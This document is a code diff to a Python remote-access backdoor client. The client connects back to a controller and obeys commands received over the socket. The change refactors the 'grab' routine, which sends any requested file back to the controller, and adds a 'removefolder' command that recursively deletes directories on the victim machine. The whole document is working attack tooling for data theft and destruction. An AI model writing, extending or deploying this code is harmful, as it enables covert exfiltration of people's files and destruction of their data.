@@ -1,18 +1,25 @@
-import socket
 import os
+import socket
 import subprocess
+import shutil
 
 def transfer(s, path):
     if os.path.exists(path):
         with open(path, 'rb') as f:
-            while True:
-                bytes_read = f.read(1024)
-                if not bytes_read:
-                    break
-                s.sendall(bytes_read)
-            s.sendall(b'DONE')
+            packet = f.read(1024)
+            while packet:
+                s.send(packet)
+                packet = f.read(1024)
+        s.send(b'DONE')
     else:
-        s.sendall(b'Unable to find out the file')
+        s.send(b'Unable to find out the file')
+
+def removefolder(path):
+    if os.path.exists(path):
+        shutil.rmtree(path)
+        return '[+] Folder removed successfully'
+    else:
+        return '[-] Folder does not exist'
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,11 +31,15 @@ def connect():
             s.close()
             break
         elif 'grab' in command:
-            grab, path = command.split('*')
+            _, path = command.split('*')
             try:
                 transfer(s, path)
             except Exception as e:
                 s.sendall(str(e).encode())
+        elif 'removefolder' in command:
+            _, path = command.split('*')
+            result = removefolder(path.strip())
+            s.sendall(result.encode())
         elif command.startswith('cd '):
             try:
                 os.chdir(command[3:].strip())
